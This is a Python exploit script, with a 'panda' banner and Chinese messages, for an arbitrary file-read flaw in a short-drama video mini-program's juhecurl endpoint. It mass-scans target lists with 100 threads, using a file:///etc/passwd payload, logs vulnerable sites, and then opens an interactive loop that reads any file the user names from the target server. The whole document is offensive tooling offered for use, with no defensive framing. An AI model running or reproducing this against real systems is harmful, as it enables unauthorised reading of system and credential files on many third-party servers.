import sys,argparse,requests,re
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def banner():
    banner = """

██████╗  █████╗ ███╗   ██╗██████╗  █████╗ 
██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗
██████╔╝███████║██╔██╗ ██║██║  ██║███████║
██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██╔══██║
██║     ██║  ██║██║ ╚████║██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
                      author:panda
                      type:短剧影视小程序前台juhecurl任意文件读取漏洞
                      date:2024-09-2
                      version:1.0
   """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="短剧影视小程序前台juhecurl任意文件读取漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/api/ems/juhecurl?url=file:///etc/passwd"
    headers = {
        "Host": "127.0.0.1",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/101.0.4951.54Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip,deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close"
    }
    try:
        res1 = requests.get(url=target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.post(url=target+payload,verify=False,headers=headers,timeout=5)
            # print(res2.text)
            if "root" in res2.text:
                print(f"该[+]网站{target}存在任意文件读取漏洞")

                with open("result.txt","a",encoding='utf-8') as f:
                    f.write(f"该网站[+]{target}存在任意文件读取漏洞\n")
                    return True
            else:
                print(f"该网站[+]{target}不存在任意文件读取漏洞")
        else:
            print(f"该网站{target}存在问题，请手工测试！！")
    except Exception as e:
        print(e)
def exp(target):

    payload = "/api/ems/juhecurl?url=file://"
    headers = {
        "Host": "127.0.0.1",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/101.0.4951.54Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip,deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close"
    }
    while True:
        filename = input(">>>>>>>请输入要查看的文件，从/开始输入(输入q退出程序)\n>>>>>>>")
        if filename == 'q':
            exit()
        try:
            res1 = requests.get(url=target,verify=False,timeout=5)
            if res1.status_code == 200:
                res2 = requests.post(url=target+payload+filename,verify=False,headers=headers,timeout=5)
                if re.findall(r"<small>(.*?)</small>",res2.text,re.S) == 443:
                    print("找不到该文件！！！")
                else:
                    print(res2.text)
        except Exception as e:
            print(e)

if __name__ == '__main__':
    main()